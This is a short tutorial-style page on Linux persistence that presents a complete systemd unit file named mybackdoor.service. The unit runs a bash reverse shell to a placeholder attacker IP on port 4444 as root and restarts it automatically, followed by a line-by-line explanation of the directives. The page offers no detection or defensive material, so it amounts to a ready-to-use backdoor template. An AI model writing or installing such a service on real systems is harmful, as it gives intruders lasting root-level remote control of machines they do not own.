Linux Persistence

systemd Services for Linux Persistence

Modern, robust persistence using systemd unit files.

Why systemd?

  • Modern Standard: Used by most current Linux distributions.
  • Robust Management: Manages system processes from boot-up.
  • Automatic Restarts: Restart=always ensures continuous operation.
  • High Privileges: Can run as root for maximum control.
  • Dependency Management: Ensures services start in the correct order (e.g., after network).
Key Takeaway

systemd provides a powerful and resilient framework for Linux persistence, allowing payloads to run with high privileges and automatically restart.

/etc/systemd/system/mybackdoor.service

systemd Service File Structure

[Unit]
Description=My Backdoor Service
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c "/bin/bash -i >& /dev/tcp/YOUR_ATTACKER_IP/4444 0>&1"
Restart=always
User=root

[Install]
WantedBy=multi-user.target
Explanation
  • [Unit]: Defines metadata and dependencies.
  • After=network.target: Ensures network is active before starting.
  • [Service]: Defines service behavior.
  • ExecStart: The command to execute (e.g., reverse shell).
  • Restart=always: Automatically restarts the service if it exits.
  • User=root: Runs the service with root privileges.
  • [Install]: Defines how the unit is enabled.
  • WantedBy=multi-user.target: Starts in normal multi-user mode.
